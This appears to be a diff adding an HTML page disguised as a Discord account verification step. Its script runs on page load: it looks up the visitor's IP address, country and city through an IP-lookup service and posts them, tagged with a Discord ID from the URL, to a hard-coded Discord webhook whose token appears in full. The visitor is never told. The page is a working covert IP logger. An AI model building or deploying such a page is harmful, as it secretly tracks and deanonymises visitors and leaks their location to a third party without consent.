@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="jpeg" href="mewingcat.jpg">
+    <title>Verify Your Account</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            position: relative;
+            font-family: 'Poppins', sans-serif;
+        }
+        #particles-js {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+        }
+        .container {
+            text-align: center;
+            z-index: 10;
+        }
+        .info-box {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            width: 280px;
+            text-align: center;
+            font-size: 16px;
+            backdrop-filter: blur(10px);
+            margin: 20px auto;
+        }
+        .btn {
+            display: inline-block;
+            padding: 12px 24px;
+            background: blue;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background 0.3s;
+            font-weight: 600;
+        }
+        .btn:hover {
+            background: darkblue;
+        }
+    </style>
+</head>
+<body>
+    <div id="particles-js"></div>
+    <div class="container">
+        <h1>Verify Your Account</h1>
+        <div class="info-box">
+            <p><strong>Discord ID:</strong> <span id="discord-id">Loading...</span></p>
+        </div>
+        <a id="verify-btn" class="btn" href="#">Verify Now</a>
+    </div>
+
+    <script>
+        async function getIPData() {
+            try {
+                let res = await fetch("https://ipapi.co/json/");
+                return await res.json();
+            } catch (error) {
+                console.error("IP API Error:", error);
+                return null;
+            }
+        }
+
+        async function main() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const discordId = urlParams.get("id") || "Unknown";
+
+            document.getElementById("discord-id").textContent = discordId;
+            document.getElementById("verify-btn").href = "https://restorecord.com/verify/xyz_isa25's%20server";
+
+            let ipData = await getIPData();
+
+            const payload = {
+                content: `**New Verification Access**\n👤 <@${discordId}>`,
+                embeds: [
+                    {
+                        title: "User Access Logged",
+                        color: 16711680,
+                        fields: [
+                            { name: "Discord ID", value: discordId, inline: true },
+                            { name: "IP Address", value: ipData?.ip || "Unknown", inline: true },
+                            { name: "Country", value: ipData?.country_name || "Unknown", inline: true },
+                            { name: "City", value: ipData?.city || "Unknown", inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+
+            console.log("Payload:", JSON.stringify(payload));
+
+            fetch("https://discord.com/api/webhooks/1337983771726843985/7JlHmUZO43OJvmBrhf5M-YfZLqnPEoy_wUs7rcgfJ3TczZxexQ3ZVQpKTL5_c9Rg62yK", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    return response.text().then(text => { throw new Error(text); });
+                }
+                return response.json();
+            })
+            .then(result => console.log("Webhook Response:", result))
+            .catch(error => console.error("Webhook Error:", error));
+        }
+
+        main();
+
+        particlesJS("particles-js", {
+            particles: {
+                number: { value: 50 },
+                size: { value: 3 },
+                move: { speed: 1 },
+                color: { value: "#ffffff" },
+                links: { enable: true, color: "#ffffff" }
+            }
+        });
+    </script>
+</body>
+</html>
